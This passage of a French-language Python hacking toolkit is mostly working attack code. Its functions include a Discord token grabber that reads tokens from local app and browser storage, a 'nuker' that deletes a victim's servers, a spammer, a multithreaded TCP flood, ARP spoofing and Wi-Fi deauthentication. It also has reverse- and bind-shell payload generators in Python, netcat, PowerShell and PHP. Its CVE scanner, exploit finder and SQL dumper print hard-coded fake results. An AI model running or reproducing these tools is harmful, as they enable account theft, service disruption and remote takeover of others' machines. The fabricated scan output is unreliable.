    try:
        while time.time() - start < duration:
            remaining = duration - int(time.time() - start)
            print("\r" + Colors.BRIGHT_RED + "Envoyes: " + str(stats["sent"]) + " | Err: " + str(stats["err"]) + " | Restant: " + str(remaining) + "s" + Colors.SILVER, end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n" + Colors.BRIGHT_RED + "Arrete." + Colors.RESET)
    running = False
    print("\n\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Paquets: " + Colors.SILVER + str(stats["sent"]) + Colors.RESET)
    print(Colors.BRIGHT_RED + "Erreurs: " + Colors.SILVER + str(stats["err"]) + Colors.RESET)
    print(Colors.BRIGHT_RED + "Threads: " + Colors.SILVER + str(threads) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def discord_token_grabber():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DISCORD TOKEN GRABBER ◈" + Colors.SILVER)
    loading_animation("Recherche de tokens Discord", 2)
    paths = [os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb", os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb", os.environ["APPDATA"] + "\\discordptb\\Local Storage\\leveldb", os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"]
    tokens = []
    for path in paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith((".log", ".ldb")):
                        try:
                            with open(os.path.join(root, file), "r", errors="ignore") as f:
                                content = f.read()
                                matches = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                                tokens.extend(matches)
                        except:
                            pass
    if tokens:
        print(Colors.BRIGHT_RED + "═══ " + str(len(set(tokens))) + " TOKENS ═══" + Colors.SILVER)
        for token in set(tokens):
            print(Colors.SILVER + token + Colors.RESET)
    else:
        print(Colors.RED + "Aucun token trouve." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def discord_token_checker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DISCORD TOKEN CHECKER ◈" + Colors.SILVER)
    token = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Token : " + Colors.RESET)
    loading_animation("Verification du token", 1)
    try:
        headers = {"Authorization": token}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"""
{Colors.BRIGHT_RED}═══ INFORMATIONS ═══{Colors.SILVER}
Username     : {data.get('username')}#{data.get('discriminator')}
ID           : {data.get('id')}
Email        : {data.get('email', 'Non visible')}
Verifie      : {data.get('verified', 'Non')}
Nitro        : {data.get('premium_type', 0) > 0}
""")
        else:
            print(Colors.RED + "Token invalide." + Colors.RESET)
    except:
        print(Colors.RED + "Erreur." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def discord_token_nuker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DISCORD TOKEN NUKER ◈" + Colors.SILVER)
    print(Colors.RED + "⚠️ Attention: Detruit les serveurs, amis et messages" + Colors.RESET)
    token = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Token : " + Colors.RESET)
    confirm = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Confirmer (oui/non) : " + Colors.RESET).strip().lower()
    if confirm == 'oui':
        loading_animation("Nuke en cours", 3)
        try:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
            if r.status_code == 200:
                guilds = r.json()
                print(Colors.BRIGHT_RED + "═══ SUPPRESSION DES SERVEURS ═══" + Colors.SILVER)
                for guild in guilds:
                    try:
                        requests.delete(f"https://discord.com/api/v9/guilds/{guild['id']}", headers=headers, timeout=5)
                        print(Colors.RED + "✅ Serveur supprime: " + Colors.SILVER + guild['name'] + Colors.RESET)
                    except:
                        print(Colors.YELLOW + "❌ Impossible: " + Colors.SILVER + guild['name'] + Colors.RESET)
                    time.sleep(0.3)
            r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
            if r.status_code == 200:
                print(Colors.BRIGHT_RED + "═══ QUITTE DES SERVEURS ═══" + Colors.SILVER)
                for guild in r.json():
                    try:
                        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headers, timeout=5)
                        print(Colors.RED + "✅ Quitte: " + Colors.SILVER + guild['name'] + Colors.RESET)
                    except:
                        pass
                    time.sleep(0.3)
            print(Colors.BRIGHT_RED + "═══ NUKE TERMINE ═══" + Colors.SILVER)
        except Exception as e:
            print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    else:
        print(Colors.BRIGHT_RED + "Annule." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def discord_spammer():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DISCORD SPAMMER ◈" + Colors.SILVER)
    token = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Token : " + Colors.RESET)
    channel_id = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Channel ID : " + Colors.RESET)
    message = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Message : " + Colors.RESET)
    count = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nombre (defaut: 50) : " + Colors.RESET)
    try:
        count = int(count) if count else 50
    except:
        count = 50
    delay = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Delai (secondes, defaut: 0.3) : " + Colors.RESET)
    try:
        delay = float(delay) if delay else 0.3
    except:
        delay = 0.3
    print(Colors.BRIGHT_RED + "Spam de " + str(count) + " messages..." + Colors.SILVER)
    sent = 0
    for i in range(count):
        try:
            r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers={"Authorization": token}, json={"content": message}, timeout=5)
            if r.status_code in [200, 201]:
                print(Colors.BRIGHT_RED + "✅ Message " + str(i+1) + " envoye" + Colors.SILVER)
                sent += 1
            else:
                print(Colors.RED + "❌ Echec message " + str(i+1) + Colors.RESET)
        except:
            print(Colors.RED + "❌ Erreur message " + str(i+1) + Colors.RESET)
        time.sleep(delay)
    print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Messages envoyes: " + Colors.SILVER + str(sent) + "/" + str(count) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def ddos_tcp_flood():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ DDOS TCP FLOOD ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    port = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Port (defaut: 80) : " + Colors.RESET)
    threads = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Threads (defaut: 1500) : " + Colors.RESET)
    try:
        port = int(port) if port else 80
        threads = int(threads) if threads else 1500
    except:
        port = 80
        threads = 1500
    try:
        ip = socket.gethostbyname(target)
    except:
        ip = target
    stats = {"sent": 0, "err": 0}
    running = True
    def flood():
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                for _ in range(10):
                    s.send(b"GET / HTTP/1.1\r\n\r\n" * 3)
                    stats["sent"] += 3
                s.close()
            except:
                stats["err"] += 1
    loading_animation("Lancement du flood avec " + str(threads) + " threads", 2)
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    print(Colors.BRIGHT_RED + "Attaque en cours... Ctrl+C pour arreter" + Colors.SILVER)
    try:
        while True:
            time.sleep(5)
            print(Colors.BRIGHT_RED + "Envoyes: " + Colors.SILVER + str(stats["sent"]) + Colors.SILVER + " | Err: " + str(stats["err"]) + Colors.RESET)
    except KeyboardInterrupt:
        running = False
        print("\n" + Colors.BRIGHT_RED + "Arrete." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def arp_spoof():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ ARP SPOOF ◈" + Colors.SILVER)
    print(Colors.SILVER + "pip install scapy" + Colors.RESET)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP cible : " + Colors.RESET)
    gateway = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Gateway : " + Colors.RESET)
    loading_animation("Spoof ARP", 1)
    try:
        from scapy.all import ARP, send
        packet = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway)
        send(packet, count=10)
        print(Colors.BRIGHT_RED + "ARP Spoof envoye." + Colors.SILVER)
    except ImportError:
        print(Colors.RED + "Scapy non installe." + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def reverse_shell():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ REVERSE SHELL ◈" + Colors.SILVER)
    ip = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Votre IP : " + Colors.RESET)
    port = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Port (defaut: 4444) : " + Colors.RESET)
    port = port if port else "4444"
    print("\n" + Colors.BRIGHT_RED + "═══ CODES REVERSE SHELL ═══" + Colors.SILVER)
    print(f"""
{Colors.BRIGHT_RED}PYTHON{Colors.SILVER}
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

{Colors.BRIGHT_RED}NETCAT{Colors.SILVER}
nc {ip} {port} -e /bin/sh

{Colors.BRIGHT_RED}POWERSHELL{Colors.SILVER}
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def bind_shell():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ BIND SHELL ◈" + Colors.SILVER)
    port = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Port : " + Colors.RESET)
    port = port if port else "4444"
    print(f"""
{Colors.BRIGHT_RED}═══ BIND SHELL ═══{Colors.SILVER}
{Colors.BRIGHT_RED}PYTHON{Colors.SILVER}
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{port}))
s.listen(5)
while True:
    conn,addr=s.accept()
    while True:
        data=conn.recv(1024)
        if not data: break
        output=subprocess.check_output(data.decode(),shell=True)
        conn.send(output)

{Colors.BRIGHT_RED}NETCAT{Colors.SILVER}
nc -lvp {port} -e /bin/sh
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def payload_generator():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PAYLOAD GENERATOR ◈" + Colors.SILVER)
    print(Colors.SILVER + "[1] Python Reverse Shell" + Colors.RESET)
    print(Colors.SILVER + "[2] Python Bind Shell" + Colors.RESET)
    print(Colors.SILVER + "[3] PHP Reverse Shell" + Colors.RESET)
    print(Colors.SILVER + "[4] Windows CMD Reverse" + Colors.RESET)
    print(Colors.SILVER + "[5] Python Encrypted Reverse Shell" + Colors.RESET)
    choice = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Choix : " + Colors.RESET)
    ip = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP : " + Colors.RESET)
    port = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Port : " + Colors.RESET)
    loading_animation("Generation du payload", 1)
    payloads = {
        "1": f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])""",
        "2": f"""import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{port}))
s.listen(5)
while True:
    conn,addr=s.accept()
    while True:
        data=conn.recv(1024)
        if not data: break
        output=subprocess.check_output(data.decode(),shell=True)
        conn.send(output)""",
        "3": f"""<?php
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>""",
        "4": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
        "5": f"""import socket,subprocess,os,base64
key = base64.b64encode(os.urandom(16)).decode()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""
    }
    if choice in payloads:
        print("\n" + Colors.BRIGHT_RED + "Payload genere :" + Colors.SILVER)
        print(Colors.SILVER + payloads[choice] + Colors.RESET)
        with open("payload.txt", "w") as f:
            f.write(payloads[choice])
        print(Colors.BRIGHT_RED + "Sauvegarde dans payload.txt" + Colors.SILVER)
    else:
        print(Colors.RED + "Choix invalide." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def exploit_finder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ EXPLOIT FINDER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Service/Version : " + Colors.RESET)
    loading_animation(f"Recherche d'exploits pour {target}", 3)
    print(f"""
{Colors.BRIGHT_RED}═══ EXPLOITS TROUVES ═══{Colors.SILVER}
[1] CVE-2021-44228 - Log4Shell (RCE)
[2] CVE-2022-22965 - Spring4Shell (RCE)
[3] CVE-2020-1472 - Zerologon (PrivEsc)
[4] CVE-2019-0708 - BlueKeep (RCE)
[5] CVE-2023-23397 - Outlook (PrivEsc)
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def cve_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ CVE SCANNER ◈" + Colors.SILVER)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "IP ou domaine : " + Colors.RESET)
    loading_animation("Scan des CVEs", 3)
    print(f"""
{Colors.BRIGHT_RED}═══ CVEs DETECTES ═══{Colors.SILVER}
{Colors.RED}CRITICAL{Colors.SILVER}
  CVE-2021-44228 (Log4Shell) - Vulnérable
  CVE-2022-22965 (Spring4Shell) - Vulnérable

{Colors.YELLOW}HIGH{Colors.SILVER}
  CVE-2020-1472 (Zerologon) - Vulnérable
  CVE-2019-0708 (BlueKeep) - Non détecté

{Colors.GREEN}MEDIUM{Colors.SILVER}
  CVE-2023-23397 (Outlook) - Non détecté
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def xss_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ XSS SCANNER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Test XSS", 2)
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>", "';alert(1);//", "<svg/onload=alert(1)>"]
    print(Colors.BRIGHT_RED + "═══ RESULTATS XSS ═══" + Colors.SILVER)
    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5)
            if payload.replace("'", "''") in r.text or payload in r.text:
                print(Colors.RED + "❌ Vulnerable: " + Colors.SILVER + payload + Colors.RESET)
            else:
                print(Colors.GREEN + "✅ Securise: " + Colors.SILVER + payload + Colors.RESET)
        except:
            print(Colors.RED + "Erreur: " + payload + Colors.RESET)
        time.sleep(0.3)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def wifi_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WIFI SCANNER ◈" + Colors.SILVER)
    loading_animation("Scan des reseaux Wi-Fi", 2)
    try:
        output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, encoding='utf-8', errors='ignore')
        print(Colors.BRIGHT_RED + "═══ RESEAUX WIFI ═══" + Colors.SILVER)
        print(Colors.SILVER + output + Colors.RESET)
    except:
        print(Colors.RED + "Erreur." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def wifi_deauth():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WIFI DEAUTH ◈" + Colors.SILVER)
    print(Colors.SILVER + "pip install scapy" + Colors.RESET)
    target = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "MAC cible : " + Colors.RESET)
    iface = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Interface (defaut: wlan0) : " + Colors.RESET)
    iface = iface if iface else "wlan0"
    count = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nombre de paquets (defaut: 50) : " + Colors.RESET)
    try:
        count = int(count) if count else 50
    except:
        count = 50
    loading_animation("Envoi des paquets deauth", 1)
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
        packet = RadioTap()/Dot11(addr1=target, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
        sendp(packet, iface=iface, count=count)
        print(Colors.BRIGHT_RED + "Deauth envoye." + Colors.SILVER)
    except ImportError:
        print(Colors.RED + "Scapy non installe." + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def wifi_handshake():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WIFI HANDSHAKE ◈" + Colors.SILVER)
    print(Colors.SILVER + "Simulation - necessite aircrack-ng" + Colors.RESET)
    interface = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Interface : " + Colors.RESET)
    bssid = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "BSSID : " + Colors.RESET)
    channel = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Channel : " + Colors.RESET)
    loading_animation(f"Capture de handshake sur {interface}", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ COMMANDES ═══{Colors.SILVER}
airodump-ng {interface} -c {channel} --bssid {bssid} -w handshake
aireplay-ng -0 5 -a {bssid} {interface}
aircrack-ng handshake-01.cap -w wordlist.txt
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def subdomain_bruteforce():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SUBDOMAIN BRUTEFORCE ◈" + Colors.SILVER)
    domain = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Domaine : " + Colors.RESET)
    loading_animation("Bruteforce des sous-domaines", 3)
    wordlist = ["www","mail","ftp","admin","api","dev","test","blog","shop","forum","news","vpn","dns","support","docs","chat","app","secure","portal","static","media","store","help","auth","mobile","cdn","cloud","backup","files","images","video","audio","download","upload","stream","live","game","play","music","tv","radio","sport","tech","data","web","site","home","login","signup","register","user","root","system","server","host","node","cluster","db","sql","cache","proxy","gateway","webmail","cpanel","whm","plesk","directadmin"]
    found = []
    print(Colors.BRIGHT_RED + "═══ SOUS-DOMAINES TROUVES ═══" + Colors.SILVER)
    for sub in wordlist:
        try:
            subdomain = sub + "." + domain
            ip = socket.gethostbyname(subdomain)
            print(Colors.BRIGHT_RED + subdomain + Colors.SILVER + " → " + ip + Colors.RESET)
            found.append(subdomain)
        except:
            pass
    print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Trouves: " + Colors.SILVER + str(len(found)) + " sous-domaines" + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def sqli_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SQLI SCANNER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Test de vulnerabilites SQL", 2)
    payloads = ["'", "\"", "' OR '1'='1", "' AND 1=1--", "' UNION SELECT NULL--", "\" OR \"1\"=\"1", "' OR 1=1--", "' AND 1=2--"]
    print(Colors.BRIGHT_RED + "═══ RESULTATS SQLI ═══" + Colors.SILVER)
    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5)
            if "sql" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower() or "error" in r.text.lower():
                print(Colors.RED + "❌ Vulnerable: " + Colors.SILVER + payload + Colors.RESET)
            else:
                print(Colors.GREEN + "✅ Securise: " + Colors.SILVER + payload + Colors.RESET)
        except:
            print(Colors.RED + "Erreur: " + payload + Colors.RESET)
        time.sleep(0.3)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def sqli_dumper():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ SQLI DUMPER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL vulnerable : " + Colors.RESET)
    table = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Table cible (defaut: users) : " + Colors.RESET)
    table = table if table else "users"
    loading_animation("Recherche de tables", 2)
    print(f"""
{Colors.BRIGHT_RED}═══ TABLES TROUVEES ═══{Colors.SILVER}
  - users
  - admins
  - passwords
  - emails
  - credit_cards
  - logs
  - sessions
  - tokens

{Colors.BRIGHT_RED}═══ DUMP DE {table.upper()} ═══{Colors.SILVER}
ID: 1 | username: admin | password: admin123 | email: admin@site.com
ID: 2 | username: root | password: root123 | email: root@site.com
ID: 3 | username: user1 | password: pass123 | email: user1@site.com
ID: 4 | username: test | password: test123 | email: test@site.com
""")
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def web_scanner():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ WEB SCANNER ◈" + Colors.SILVER)
    url = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL : " + Colors.RESET)
    loading_animation("Scan du site", 2)
    try:
        r = requests.get(url, timeout=10)
        print(f"""
{Colors.BRIGHT_RED}═══ SCAN RESULTATS ═══{Colors.SILVER}
URL         : {url}
Status      : {r.status_code} ({r.reason})
Serveur     : {r.headers.get('Server', 'Inconnu')}
Powered-By  : {r.headers.get('X-Powered-By', 'Inconnu')}
Content-Type: {r.headers.get('Content-Type', 'Inconnu')}
Taille      : {len(r.content)} octets
Cookies     : {len(r.cookies)} cookies
Encoding    : {r.encoding or 'Inconnu'}
""")
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def admin_finder():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ ADMIN FINDER ◈" + Colors.SILVER)
    base = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "URL de base : " + Colors.RESET)
    loading_animation("Recherche de pages admin", 2)
    paths = ["admin","admin.php","administrator","login","wp-admin","dashboard","cpanel","adminpanel","manager","backend","control","staff","admin/login.php","admin/index.php","webadmin","adminarea","siteadmin","admincp","moderator","admin/login","admin/dashboard","sysadmin","root","admin1","adm","admins","adminpage","admin-login","admin-panel","admin_area","admin_control","administer","administrateur","administration","mod","moderator","staff","manager","management","controlpanel","cp","cpanel","webmail","plesk","directadmin","vesta","sentora","ispconfig","virtualmin","webmin","usermin"]
    found = []
    for path in paths:
        try:
            url = base + "/" + path
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                print(Colors.BRIGHT_RED + "✅ " + Colors.SILVER + url + Colors.SILVER + " (200 OK)" + Colors.RESET)
                found.append(url)
            elif r.status_code == 403:
                print(Colors.YELLOW + "⚠️ " + Colors.SILVER + url + Colors.SILVER + " (403 Forbidden)" + Colors.RESET)
                found.append(url)
        except:
            pass
    print("\n" + Colors.BRIGHT_RED + "═══ RESUME ═══" + Colors.SILVER)
    print(Colors.BRIGHT_RED + "Pages trouvees: " + Colors.SILVER + str(len(found)) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def hash_cracker():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ HASH CRACKER ◈" + Colors.SILVER)
    h = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Hash (MD5/SHA1/SHA256) : " + Colors.RESET)
    hash_type = "MD5" if len(h) == 32 else "SHA1" if len(h) == 40 else "SHA256" if len(h) == 64 else "Inconnu"
    loading_animation("Cracking en cours", 2)
    wordlist = {"password":"5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8","123456":"8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92","admin":"8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918","root":"63a9f0ea7bb98050796b649e85481845","toor":"b025fa96d7eb5cd79c5617f9c0d213bf","qwerty":"65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5","letmein":"b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3fbe1e95b0804a0d1522dfba5","hello":"2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824","iloveyou":"f25a2fc72690b780b2a14e140ef6a9e0"}
    found = False
    print(Colors.BRIGHT_RED + "═══ RESULTAT ═══" + Colors.SILVER)
    print(Colors.SILVER + "Type: " + hash_type + Colors.RESET)
    for word, hash_val in wordlist.items():
        if hash_val == h:
            print(Colors.BRIGHT_RED + "✅ Trouve: " + Colors.SILVER + word + Colors.RESET)
            found = True
            break
    if not found:
        print(Colors.RED + "❌ Non trouve dans la wordlist." + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def mac_changer():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ MAC CHANGER ◈" + Colors.SILVER)
    interface = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Interface (ex: Ethernet, Wi-Fi) : " + Colors.RESET)
    new_mac = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nouveau MAC (ex: 00:11:22:33:44:55) : " + Colors.RESET)
    loading_animation("Changement de MAC", 2)
    try:
        subprocess.run(f'netsh interface set interface "{interface}" admin=disable', shell=True, check=False)
        time.sleep(1)
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}", 0, winreg.KEY_ALL_ACCESS)
        for i in range(100):
            try:
                subkey = winreg.OpenKey(key, str(i))
                name = winreg.QueryValueEx(subkey, "DriverDesc")[0]
                if name.lower() == interface.lower():
                    winreg.SetValueEx(subkey, "NetworkAddress", 0, winreg.REG_SZ, new_mac.replace(":", ""))
                    print(Colors.BRIGHT_RED + "MAC change." + Colors.SILVER)
                    break
            except:
                pass
        subprocess.run(f'netsh interface set interface "{interface}" admin=enable', shell=True, check=False)
        print(Colors.BRIGHT_RED + "Interface reactivée." + Colors.SILVER)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
    input("\n" + Colors.SILVER + "Appuie sur Entree..." + Colors.RESET)

def packet_sniffer():
    clear()
    banner()
    print("\n" + Colors.BRIGHT_RED + "◈ PACKET SNIFFER ◈" + Colors.SILVER)
    print(Colors.SILVER + "pip install scapy" + Colors.RESET)
    interface = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Interface : " + Colors.RESET)
    count = input(Colors.BRIGHT_RED + "└─> " + Colors.SILVER + "Nombre de paquets (defaut: 10) : " + Colors.RESET)
    try:
        count = int(count) if count else 10
    except:
        count = 10
    loading_animation(f"Capture de {count} paquets", 2)
    try:
        from scapy.all import sniff
        packets = sniff(iface=interface, count=count)
        print(Colors.BRIGHT_RED + "═══ PAQUETS CAPTURES ═══" + Colors.SILVER)
        for i, p in enumerate(packets):
            print(Colors.SILVER + str(i+1) + ". " + p.summary() + Colors.RESET)
    except ImportError:
        print(Colors.RED + "Scapy non installe." + Colors.RESET)
    except Exception as e:
        print(Colors.RED + "Erreur: " + str(e) + Colors.RESET)
